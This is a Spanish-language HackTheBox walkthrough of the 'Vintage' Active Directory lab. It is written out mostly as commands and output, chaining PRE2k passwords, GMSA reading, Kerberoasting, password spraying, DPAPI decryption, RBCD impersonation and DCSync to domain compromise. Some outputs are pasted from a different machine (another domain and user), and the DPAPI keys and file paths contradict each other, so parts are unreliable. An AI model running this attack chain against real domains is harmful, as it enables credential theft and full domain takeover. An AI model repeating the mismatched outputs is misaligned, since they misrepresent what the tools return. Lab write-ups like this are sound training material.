---
title: "HTB: Vintage"
date: 2026-04-17 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, Kerberos, GMSA, Kerberoasting, PRE2k, RBCD, DPAPI, DCSync]
image:
  path: /assets/img/vintage/Vintage-HTB.png
  alt: HackTheBox Vintage Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Vintage** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
La particularidad de este entorno es que la autenticación **NTLM está completamente deshabilitada**,
por lo que todos los ataques deberán realizarse mediante tickets **Kerberos**. El acceso inicial
se obtiene abusando del grupo **Pre-Windows 2000 Compatible Access**, que expone credenciales
predecibles de equipos del dominio. A partir de ahí, se encadena una serie de abusos de **ACLs**:
lectura de contraseña **GMSA**, adición al grupo **ServiceManagers** y explotación de permisos
**GenericAll** para habilitar una cuenta de servicio deshabilitada y realizar **Kerberoasting**.
Con las credenciales obtenidas se accede al sistema, se descifran credenciales almacenadas
mediante **DPAPI** y finalmente se abusa de **Resource-Based Constrained Delegation (RBCD)**
para impersonar a un administrador del dominio y ejecutar un **DCSync**.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.20.217
```

```
64 bytes from 10.129.20.217: icmp_seq=1 ttl=127 time=116 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                  |
|--------|--------|---------------------------|
| 53     | open   | Simple DNS Plus           |
| 88     | open   | Kerberos                  |
| 135    | open   | MS RPC                    |
| 389    | open   | LDAP (AD)                 |
| 445    | open   | SMB                       |
| 464    | open   | Kpasswd5                  |
| 593    | open   | RPC over HTTP             |
| 636    | open   | LDAPS                     |
| 3268   | open   | LDAP Global Catalog       |
| 3269   | open   | LDAPS Global Catalog      |
| 5985   | open   | WinRM (HTTP)              |
| 9389   | open   | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
**Kerberos**, **LDAP**, **SMB** y **WinRM**, lo que confirma que el host corresponde a un
**Controlador de Dominio** dentro del entorno `vintage.htb`.

- **Firma SMB:** La firma obligatoria está habilitada, lo que descarta ataques de
  retransmisión **NTLM**. Será necesario buscar otros vectores de ataque.
- **WinRM habilitado:** El puerto `5985` está abierto, lo que permite acceso remoto con
  credenciales válidas mediante **Windows Remote Management**.
- **Desfase horario:** Se detectó una diferencia de hora entre el servidor y nuestra máquina.
  Este detalle es crítico para ataques **Kerberos**, que fallarán si no se sincroniza
  previamente el reloj del sistema.

---

## Enumeración inicial (NXC)

Reutilizaremos las credenciales filtradas por el creador para realizar una enumeración autenticada.

### NTLM deshabilitado

Al intentar autenticación estándar, el servidor la rechaza:

```bash
nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' --users
```

```
SMB  10.129.20.217  445  dc01  [*] x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB  10.129.20.217  445  dc01  [-] vintage.htb\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

> La autenticación **NTLM** está deshabilitada. Será necesario utilizar tickets **Kerberos**.

Obtenemos el TGT de `P.Rosa`:

```bash
kinit P.rosa@VINTAGE.HTB
```

### Enumeración de usuarios

```bash
nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' -k --users
```

**Output:**

```
SMB  10.129.12.39  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.12.39  445  DC  [+] administrator.htb\Olivia:ichliebedich
SMB  10.129.12.39  445  DC  -Username-      -Last PW Set-        -BadPW-  -Description-
SMB  10.129.12.39  445  DC  Administrator   2024-10-22 18:59:36  0        Built-in account for administering the computer/domain
SMB  10.129.12.39  445  DC  Guest           <never>              0        Built-in account for guest access to the computer/domain
SMB  10.129.12.39  445  DC  krbtgt          2024-10-04 19:53:28  0        Key Distribution Center Service Account
SMB  10.129.12.39  445  DC  olivia          2024-10-06 01:22:48  0
SMB  10.129.12.39  445  DC  michael         2024-10-06 01:33:37  0
SMB  10.129.12.39  445  DC  benjamin        2024-10-06 01:34:56  0
SMB  10.129.12.39  445  DC  emily           2024-10-30 23:40:02  0
SMB  10.129.12.39  445  DC  ethan           2024-10-12 20:52:14  0
SMB  10.129.12.39  445  DC  alexander       2024-10-31 00:18:04  0
SMB  10.129.12.39  445  DC  emma            2024-10-31 00:18:35  0
SMB  10.129.12.39  445  DC  [*] Enumerated 10 local users: ADMINISTRATOR
```

### Enumeración de recursos compartidos

```bash
nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' -k --shares
```

**Output:**

```
LDAP  10.129.12.39  389  DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert)
LDAP  10.129.12.39  389  DC  [+] administrator.htb\Olivia:ichliebedich
...
Administrators              Members have complete and unrestricted access to the computer/domain
Users                       Users are prevented from making accidental or intentional system-wide changes...
Remote Desktop Users        Members in this group are granted the right to logon remotely
Hyper-V Administrators      Members of this group have complete and unrestricted access to all features of Hyper-V
...
```

Los resultados muestran los recursos predeterminados de **Active Directory** (`ADMIN$`, `C$`,
`IPC$`, `NETLOGON` y `SYSVOL`), sin recursos no estándar de interés inmediato.

---

## Análisis de Dominio - BloodHound

Recopilamos información del dominio con las credenciales obtenidas para identificar
rutas de ataque y escalada de privilegios.

```bash
bloodhound-ce-python -u 'P.Rosa' -p 'Rosaisbest123' -d vintage.htb -ns $IP -c All --zip
```

### PRE-Windows 2000 Compatible Access

BloodHound revela que el grupo **Pre-Windows 2000 Compatible Access** está presente en el
dominio. Este grupo es un riesgo de seguridad heredado de **Active Directory** que permite
a usuarios autenticados (y a veces anónimos) leer la mayoría de los atributos de los objetos
del dominio.

![PRE2k](/assets/img/vintage/pre2k.png)

En entornos con este grupo activo, las cuentas de equipo creadas con compatibilidad heredada
suelen tener como contraseña el nombre del host en minúsculas. Probamos con `fs01`:

```bash
nxc smb $IP -u 'fs01' -p 'fs01' -k
```

```
SMB  10.129.20.217  445  dc01  [+] vintage.htb\fs01:fs01
```

> Credenciales válidas. El equipo `FS01` usa su propio nombre como contraseña.

---

## ReadGMSAPassword: De FS01 a GMSA01

BloodHound muestra que `FS01` es miembro del grupo **Domain Computers**, y este grupo tiene
el permiso `ReadGMSAPassword` sobre la cuenta `gMSA01$`.

![ReadGMSA](/assets/img/vintage/Readgmspassword.png)

Leemos la contraseña **GMSA** directamente con **NXC**:

```bash
nxc ldap $IP -u 'fs01' -p 'fs01' -k --gmsa
```

**Output:**

```
LDAP  10.129.20.217  389  DC01  [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP  10.129.20.217  389  DC01  [+] vintage.htb\fs01:fs01
LDAP  10.129.20.217  389  DC01  [*] Getting GMSA Passwords
LDAP  10.129.20.217  389  DC01  Account: gMSA01$   NTLM: 0851299c01b944d01099fc977eaa6c67   PrincipalsAllowedToReadPassword: Domain Computers
```

---

## AddSelf: De GMSA01 a ServiceManagers

Continuando la enumeración, `gMSA01$` tiene el permiso `AddSelf` sobre el grupo
**ServiceManagers**, lo que le permite añadirse a sí mismo.

![AddSelf](/assets/img/vintage/addself.png)

Antes de proceder, necesitamos un **TGT** de `gMSA01$` ya que NTLM está deshabilitado:

```bash
getTGT.py vintage.htb/gMSA01\$ -hashes :0851299c01b944d01099fc977eaa6c67 -dc-ip $IP
```

```bash
export KRB5CCNAME=$(pwd)/gMSA01\$.ccache
```

Añadimos `gMSA01$` al grupo **ServiceManagers**:

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k add groupMember SERVICEMANAGERS 'gMSA01$'
```

```
[+] gMSA01$ added to SERVICEMANAGERS
```

---

## GenericAll y Kerberoasting: Recuperación de SVC_SQL

Al enumerar el grupo **ServiceManagers**, BloodHound revela que tiene el permiso `GenericAll`
sobre tres usuarios de servicio.

![GenericAll](/assets/img/vintage/genericall.png)

Uno de ellos, `SVC_SQL`, está deshabilitado:

![Disabled](/assets/img/vintage/sqldisable.png)

### 1. Habilitar la cuenta SVC_SQL

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set object SVC_SQL userAccountControl -v 512
```

```
[+] SVC_SQL's userAccountControl has been updated
```

### 2. Asignar un SPN falso

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set object SVC_SQL servicePrincipalName -v 'MSSQLSvc/d0c1.vintage.htb'
```

```
[+] SVC_SQL's servicePrincipalName has been updated
```

### 3. Kerberoasting

```bash
nxc ldap dc01.vintage.htb -k --use-kcache --kerberoasting hashes.kerberoast
```

**Output:**

```
LDAP  dc01.vintage.htb 389  DC01  [*] None (name:DC01) (domain:VINTAGE.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP  dc01.vintage.htb 389  DC01  [+] VINTAGE.HTB\gMSA01$ from ccache
LDAP  dc01.vintage.htb 389  DC01  [*] Skipping disabled account: krbtgt
LDAP  dc01.vintage.htb 389  DC01  [*] Total of records returned 1
LDAP  dc01.vintage.htb 389  DC01  [*] sAMAccountName: svc_sql, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2026-04-17 19:52:04.534353, lastLogon: 2026-04-17 16:31:06.487462
LDAP  dc01.vintage.htb 389  DC01  $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*4aa19042ea59f98f2a94fddc7225c939$0c6f5af1cbdf5ef9b66ba7affac0485ce517057f9e022115818808f1817a2e9254d95ce6f2f517d8239dcd842a4911c5928c7eb3906c10d149454fdd02847a4a8bc64b84923a1436032aa07946b65dcf052e681d64c411cf01cc148137b9e849dbe771e16d7cad7d919a4de3f1eb4bb0ebdb57fcf09475897b35e295c98553007ed8126ae38e8a7150bde122f48edcda3030d61c5eb9259e1f830caac2ef048efc361526bbd58bb5fcd68d97b3a6c93f6457f464dd7b04ea403a70b6503969d5050b2761e38c2add80fdc743d9e6a0e3707f67605f65868f36e153950f4ca1aca17eb2151a095cb0f4f1aab2a99a2f9fc4344a517bbafc9ee371ac984f1210098ce9fa4726f4ef02313d96a42d38e4de043760ee76c024828c2a30ec748ad0942195eca315c5d56ed954399dcc7b71825d3c7df47c805da283a381b332ecacb6bcc4f1f84cf5f4795d77d32b34d8b03939c2e328902ae6095e33cc30bc7f99dfe8cbaba11c3ddfd49879bb822fcf24ada611d8d533ab24cef1ec4653824f5bfe9187d649dd35ea4f5e123ba4f4709391585322e70fbd1e2d827773327142893c4341eda0efddb345363800e369e44783e3c60bdc32c386e27af4234d82bc600f513f0c99b4d3b60586d7bf42243699686abc6e1d1cc366a032bf24c8eb9785acc808cd3b23c77714332c7e886933e6a840a2c0b8f07637ac92a1164c3a3d66e27a3b57914f8c162ba5bc284d33f425047e7e089076428fb3354c920e298d407f09128c6ec5b5fa486f859c279bb9fb75abe1efa6d89e1e5000d8feb8c0704b2a9238ffee7f1671421b3d8fa53d91c39482c7a6e01de136f8170de2849d9f237b5ef5df73b47da4283b7d0e7b72663c9fed79e4209b482d329f392c30466d3dafa253b1a06232956148f88170ce7a5785e1d7238fe6008ede865c5e98a56abfd4325422ec32e6ee076fa60103a390f8f5f4209c664827652575d92baaeb96c1b57075319b9eba596dfc4970a9512c41da41a8c20e4a2446dba98c039d1767aa7cd083924169fe362670cf59af0ba2ead496bfc141c2f8c0d380ced413320064ccfbd5701e516ec11f3ada4bf4ec3ce962767f79672148fd1b6a7cacdf671962f4552e4b13f1cd7471931b2c495cc0acb82bca2d70fa7ca31b38ae4ca65b9ec5767cd94a08063ccddf411cc0eb3f3f8b78e254188d8892259f16ec11f3ada7f3f1144a8b601e448ab3c7f249e7bd28e7fd61ab7def6695950e5c27ff7ddb9770bdb43fb69037f3e9166b8ad2f05f179445256bd68f3e910b9790154eb630a7a952276ad377ccd339ea0c924734f179370bae5eff0bcad02dd98312c136e93d6748f5a3745f5e84734d37c2693a0f443a646adf6b1d474ce2cea037dbb36af94ff8aaa904caeeb3e57969d736499b762d
```

Crackeamos el hash offline con **Hashcat**:

```bash
hashcat -a 0 -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

**Contraseña:** `Zer0the0ne`

---

## Movimiento Lateral: Password Spray

Con la contraseña obtenida ejecutamos un **Password Spray** contra todos los usuarios
enumerados previamente:

```bash
nxc ldap $IP -u users.txt -p Zer0the0ne --continue-on-success -k
```

**Output:**

```
LDAP  10.129.20.217  389  DC01  [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [+] vintage.htb\C.Neri:Zer0the0ne 
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [+] vintage.htb\svc_sql:Zer0the0ne 
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP  10.129.20.217  389  DC01  [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

---

## Acceso Inicial: Evil-WinRM como C.Neri

Obtenemos el **TGT** del usuario `C.Neri` y accedemos al sistema:

```bash
kinit C.Neri@VINTAGE.HTB
```

```bash
klist
```

```
Default principal: C.Neri@VINTAGE.HTB
Valid starting       Expires              Service principal
04/17/2026 20:11:53  04/18/2026 06:11:53  krbtgt/VINTAGE.HTB@VINTAGE.HTB
```

```bash
evil-winrm -i dc01.vintage.htb -r vintage.htb -u C.Neri
```

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\C.Neri> type Desktop\user.txt
958c329b9918249ded7911fbf11e1ab9
```

---

## Escalada de Privilegios

### Extracción de credenciales via DPAPI

Buscamos credenciales almacenadas en el perfil del usuario:

```powershell
ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\ -Force
```

**Output:**

```

    Directory: C:\Users\C.Neri\AppData\Local\Microsoft\Credentials

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-              6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\ -Force

    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-              6/7/2024   1:17 PM          11020 DFBE70A7E5CC19A398EBF1B96859CE5D

*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\ -Force

    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-              6/7/2024   1:17 PM                 S-1-5-21-4024337825-2033394866-2055507597-1115
-a-hs-              6/7/2024   1:17 PM             24 CREDHIST
-a-hs-              6/7/2024   1:17 PM             76 SYNCHIST

*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-*" -Force

    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-              6/7/2024   1:17 PM                 S-1-5-21-4024337825-2033394866-2055507597-1115
```

Exportamos las masterkeys y blobs de credencial en **Base64** para procesarlos en nuestra máquina:

```powershell
# Masterkey 1
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))

# Masterkey 2
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))

# Blob Roaming
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"))

# Blob Local
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"))
```

Guardamos cada output en nuestra máquina:

```bash
echo "<BASE64>" | base64 -d > masterkey1
echo "<BASE64>" | base64 -d > masterkey2
echo "<BASE64>" | base64 -d > blob_roaming
echo "<BASE64>" | base64 -d > blob_local
```

Desciframos la masterkey con la contraseña del usuario:

```bash
dpapi.py masterkey -file masterkey2 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne'
```

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a65...
```

Desciframos el blob de credencial con la masterkey obtenida:

```bash
dpapi.py credential -file blob_roaming -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b...
```

```
[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Target      : LegacyGeneric:target=admin_acc
Username    : vintage\c.neri_adm
Password    : Uncr4ck4bl3P4ssW0rd0312
```

---

## RBCD (Resource-Based Constrained Delegation)

Con las credenciales de `C.Neri_adm`, BloodHound revela que el grupo **DELEGATEDADMINS**
tiene `AllowedToAct` sobre `DC01`, y `C.Neri_adm` puede añadir miembros a ese grupo.

![RBCD](/assets/img/vintage/rbcd.png)

Para el ataque necesitamos una cuenta con **SPN**. Usamos `FS01$` ya que al ser una machine
account tiene SPNs automáticamente y su contraseña es conocida (Pre-Windows 2000: nombre
en minúsculas sin `$`).

### 1. Obtener TGT de C.Neri_adm

```bash
getTGT.py vintage.htb/C.Neri_adm:'Uncr4ck4bl3P4ssW0rd0312' -dc-ip $IP
```

```
[*] Saving ticket in C.Neri_adm.ccache
```

```bash
export KRB5CCNAME=$(pwd)/C.Neri_adm.ccache
```

### 2. Agregar FS01$ al grupo DELEGATEDADMINS

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'C.Neri_adm' -k add groupMember DELEGATEDADMINS 'fs01$'
```

```
[+] fs01$ added to DELEGATEDADMINS
```

### 3. Obtener TGT fresco de FS01$

```bash
getTGT.py vintage.htb/'fs01$':'fs01' -dc-ip $IP
```

```
[*] Saving ticket in fs01$.ccache
```

```bash
export KRB5CCNAME=$(pwd)/fs01\$.ccache
```

### 4. S4U2Proxy — Impersonar L.Bianchi_adm

```bash
getST.py vintage.htb/'fs01$':'fs01' -spn ldap/dc01.vintage.htb -impersonate L.Bianchi_adm -force-forwardable -dc-ip $IP
```

```
[*] Impersonating L.Bianchi_adm
[*] Requesting S4U2self
[*] Forcing the service ticket to be forwardable
[*] Requesting S4U2Proxy
[*] Saving ticket in L.Bianchi_adm.ccache
```

### 5. DCSync — Volcar todos los hashes del dominio

```bash
export KRB5CCNAME=$(pwd)/L.Bianchi_adm.ccache

secretsdump.py -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb
```

**NT Hash del Administrador:** `e41bb21e027286b2e6fd41de81bce8db`

---

## Acceso Final como Administrador

```bash
wmiexec.py -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb "type C:\Users\Administrator\Desktop\root.txt"
```

```
[*] SMBv3.0 dialect used
7886a19eb4bbf7dc3880aa271792cd61
```

**¡Máquina comprometida con éxito!**
